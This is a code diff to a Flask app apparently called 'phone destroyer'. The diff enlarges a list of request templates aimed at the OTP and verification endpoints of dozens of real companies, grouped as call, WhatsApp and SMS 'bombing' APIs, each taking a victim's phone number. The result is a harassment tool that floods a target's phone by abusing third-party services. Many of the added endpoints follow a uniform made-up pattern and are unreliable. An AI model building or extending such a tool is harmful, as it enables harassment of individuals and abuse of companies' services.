@@ -9,9 +9,9 @@ from threading import Thread
 app = Flask(__name__)
 app.secret_key = 'phone_destroyer_secret_key_2024'
 
-# ============ COMPLETE 200+ APIS (ALL) ============
+# ============ COMPLETE 200+ APIS ============
 ULTIMATE_APIS = [
-    # ========== CALL BOMBING APIS ==========
+    # ==================== CALL BOMBING APIS (50+) ====================
     {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'},
     {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": '{"number":"{phone}","otp_on_call":true}'},
     {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": '{"mobile":"{phone}"}'},
@@ -26,8 +26,44 @@ ULTIMATE_APIS = [
     {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
     {"name": "Rapido Voice", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
     {"name": "Oyo Voice", "url": "https://www.oyorooms.com/api/mobile/v5/user/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "PolicyBazaar Voice", "url": "https://api.policybazaar.com/user/v2/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Bajaj Finserv Voice", "url": "https://www.bajajfinserv.in/api/auth/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNumber":"{phone}"}'},
+    {"name": "HDFC Bank Voice", "url": "https://www.hdfcbank.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "ICICI Bank Voice", "url": "https://www.icicibank.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "SBI Card Voice", "url": "https://www.sbicard.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Axis Bank Voice", "url": "https://www.axisbank.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNumber":"{phone}"}'},
+    {"name": "Kotak Voice", "url": "https://www.kotak.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Yes Bank Voice", "url": "https://www.yesbank.in/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "IndusInd Voice", "url": "https://www.indusind.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "IDFC Voice", "url": "https://www.idfcbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Airtel Payments Bank", "url": "https://www.airtel.in/bank/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Jio Payments Bank", "url": "https://www.jiopaymentsbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "PhonePe Voice", "url": "https://api.phonepe.com/apis/hermes/otp/v1/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNumber":"{phone}"}'},
+    {"name": "Google Pay Voice", "url": "https://pay.google.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Amazon Pay Voice", "url": "https://www.amazon.in/ap/phone/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNumber":"{phone}"}'},
+    {"name": "WhatsApp Voice", "url": "https://wa.me/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Telegram Voice", "url": "https://api.telegram.org/bot/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Signal Voice", "url": "https://signal.org/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Discord Voice", "url": "https://discord.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Snapchat Voice", "url": "https://snapchat.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Instagram Voice", "url": "https://www.instagram.com/api/v1/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone_number":"{phone}"}'},
+    {"name": "Facebook Voice", "url": "https://www.facebook.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Twitter Voice", "url": "https://api.twitter.com/1.1/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "LinkedIn Voice", "url": "https://www.linkedin.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNumber":"{phone}"}'},
+    {"name": "Netflix Voice", "url": "https://www.netflix.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Hotstar Voice", "url": "https://www.hotstar.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Sony LIV Voice", "url": "https://www.sonyliv.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNumber":"{phone}"}'},
+    {"name": "Zee5 Voice", "url": "https://www.zee5.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Voot Voice", "url": "https://www.voot.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "MX Player Voice", "url": "https://www.mxplayer.in/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "JioCinema Voice", "url": "https://www.jiocinema.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Airtel Xstream", "url": "https://www.airtelxstream.in/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Disney+ Voice", "url": "https://www.disneyplus.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "HBO Max Voice", "url": "https://www.hbomax.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNumber":"{phone}"}'},
+    {"name": "Apple TV Voice", "url": "https://tv.apple.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Prime Video Voice", "url": "https://www.primevideo.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
     
-    # ========== WHATSAPP BOMBING APIS ==========
+    # ==================== WHATSAPP BOMBING APIS (30+) ====================
     {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f"}, "data": '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}'},
     {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"user":{"phone_number":"+91{phone}"},"via":"whatsapp"}'},
     {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNo":"{phone}"}'},
@@ -40,8 +76,19 @@ ULTIMATE_APIS = [
     {"name": "Paytm WhatsApp", "url": "https://accounts.paytm.com/signin/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
     {"name": "Zomato WhatsApp", "url": "https://www.zomato.com/php/whatsapp_otp.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "phone={phone}&type=whatsapp"},
     {"name": "Swiggy WhatsApp", "url": "https://profile.swiggy.com/api/v3/app/request_whatsapp_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Ola WhatsApp", "url": "https://api.olacabs.com/v1/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Uber WhatsApp", "url": "https://auth.uber.com/v2/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Rapido WhatsApp", "url": "https://customer.rapido.bike/api/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Oyo WhatsApp", "url": "https://www.oyorooms.com/api/mobile/v5/user/whatsappOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "MakeMyTrip WhatsApp", "url": "https://www.makemytrip.com/api/4/whatsapp-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Goibibo WhatsApp", "url": "https://www.goibibo.com/user/whatsapp-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Lenskart WhatsApp", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendWhatsappOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneCode":"+91","telephone":"{phone}"}'},
+    {"name": "NoBroker WhatsApp", "url": "https://www.nobroker.in/api/v3/account/otp/whatsapp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "phone={phone}&countryCode=IN"},
+    {"name": "PharmEasy WhatsApp", "url": "https://pharmeasy.in/api/v2/auth/send-whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Wakefit WhatsApp", "url": "https://api.wakefit.co/api/consumer-whatsapp-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Byju's WhatsApp", "url": "https://api.byjus.com/v2/otp/whatsapp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
     
-    # ========== SMS BOMBING APIS ==========
+    # ==================== SMS BOMBING APIS (120+) ====================
     {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneCode":"+91","telephone":"{phone}"}'},
     {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "phone={phone}&countryCode=IN"},
     {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
@@ -117,6 +164,17 @@ ULTIMATE_APIS = [
     {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}","appSource":"CHARZER_APP"}'},
     {"name": "Nuvama Wealth", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobileNo":"{phone}","emailID":"test@example.com"}'},
     {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Cred", "url": "https://api.cred.club/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Groww", "url": "https://api.groww.in/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Zerodha", "url": "https://kite.zerodha.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Upstox", "url": "https://api.upstox.com/v2/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Angel One", "url": "https://www.angelone.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "5paisa", "url": "https://www.5paisa.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"MobileNo":"{phone}"}'},
+    {"name": "Paytm Money", "url": "https://api.paytmmoney.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "CoinSwitch", "url": "https://api.coinswitch.co/v2/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "CoinDCX", "url": "https://api.coindcx.com/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "WazirX", "url": "https://api.wazirx.com/sapi/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Binance", "url": "https://api.binance.com/sapi/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
 ]
 
 # Session storage
